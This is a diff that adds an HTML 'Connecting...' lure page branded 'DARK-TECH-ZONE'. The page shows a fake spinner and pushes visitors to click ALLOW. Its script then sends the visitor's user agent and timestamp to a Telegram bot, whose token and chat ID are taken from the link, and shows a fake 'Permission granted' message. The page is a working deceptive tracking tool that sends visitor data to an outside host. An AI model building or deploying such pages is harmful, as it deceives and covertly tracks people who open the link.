@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Connecting...</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+body{
+  margin:0;
+  height:100vh;
+  background:#000;
+  font-family:Arial,Helvetica,sans-serif;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  color:#fff;
+}
+
+.box{
+  width:90%;
+  max-width:420px;
+  background:#0b0b0b;
+  border-radius:12px;
+  padding:25px;
+  text-align:center;
+  box-shadow:0 0 25px rgba(0,255,0,.25);
+}
+
+.loader{
+  width:60px;
+  height:60px;
+  border:6px solid #222;
+  border-top:6px solid #00ff88;
+  border-radius:50%;
+  margin:20px auto;
+  animation:spin 1s linear infinite;
+}
+
+@keyframes spin{
+  0%{transform:rotate(0deg)}
+  100%{transform:rotate(360deg)}
+}
+
+button{
+  width:100%;
+  padding:12px;
+  margin-top:15px;
+  border:none;
+  border-radius:8px;
+  font-size:16px;
+  font-weight:bold;
+  cursor:pointer;
+}
+
+.allow{
+  background:#00ff88;
+  color:#000;
+}
+
+.deny{
+  background:#ff4444;
+  color:#fff;
+}
+
+.small{
+  font-size:13px;
+  opacity:.8;
+  margin-top:10px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="box">
+  <h2>Connecting…</h2>
+  <div class="loader"></div>
+
+  <p>Please allow permission to continue</p>
+
+  <button class="allow" onclick="allowAccess()">ALLOW</button>
+  <button class="deny" onclick="denyAccess()">DENY</button>
+
+  <div class="small">
+    Powered by DARK-TECH-ZONE
+  </div>
+</div>
+
+<script>
+const params = new URLSearchParams(window.location.search);
+const token = params.get("token");
+const chatId = params.get("chat");
+
+function allowAccess(){
+  if(!token || !chatId){
+    alert("Invalid link");
+    return;
+  }
+
+  const message =
+`📲 New Visitor Opened Link
+🌍 IP: (browser-based)
+🕒 Time: ${new Date().toLocaleString()}
+🧭 User Agent: ${navigator.userAgent}`;
+
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`,{
+    method:"POST",
+    headers:{ "Content-Type":"application/json" },
+    body:JSON.stringify({
+      chat_id: chatId,
+      text: message
+    })
+  })
+  .then(()=> {
+    document.querySelector(".box").innerHTML = `
+      <h2>Connected</h2>
+      <p>Permission granted successfully.</p>
+      <div class="small">You may now close this page.</div>
+    `;
+  })
+  .catch(()=>{
+    alert("Connection failed");
+  });
+}
+
+function denyAccess(){
+  document.querySelector(".box").innerHTML = `
+    <h2>Permission Denied</h2>
+    <p>You denied access.</p>
+    <div class="small">You may close this page.</div>
+  `;
+}
+</script>
+
+</body>
+</html>
